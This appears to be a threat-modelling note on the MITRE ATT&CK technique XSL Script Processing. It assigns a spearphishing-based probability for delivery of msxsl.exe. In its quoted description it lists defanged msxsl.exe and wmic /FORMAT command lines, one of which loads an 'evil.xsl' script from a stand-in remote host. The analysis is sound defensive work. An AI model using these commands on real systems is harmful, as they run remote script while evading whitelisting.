# XSL Script Processing https://attack.mitre.org/techniques/T1220/

## Context 

Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. [1]

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses. Similar to Trusted Developer Utilities, the Microsoft common line transformation utility binary (msxsl.exe) [2] can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. [3] Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. [4] Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.[5]

Command-line examples:[3][5]

msxsl.exe customers[.]xml script[.]xsl
msxsl.exe script[.]xsl script[.]xsl
msxsl.exe script[.]jpeg script[.]jpeg
Another variation of this technique, dubbed "Squiblytwo", involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file.[6] This technique can also execute local/remote scripts and, similar to its Regsvr32/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.[5]

Command-line examples:[5][6]

Local File: wmic process list /FORMAT:evil[.]xsl
Remote File: wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"

This technique needs a probability distribution in order to assess the prevalence of the adversary delivering the msxsl.exe to the user for installation. 

## Relevant findings

https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/
The main way of delivering the msxsl.exe for installation is via spearphishing. 

## Result 

We assess the probability distribution to be the same as for Spearphishing via Email [Bernoulli(0.712)*Exponential(1)].

## Discussion

We could, instead of adding the same probability distribution every time spearphishing is a way of delivering payload add it as parent. (same goes for Compiled HTML File) This might already (indirectly) be the case but I couldn't find a way of making sure of this (the graph is too big to be explored manually)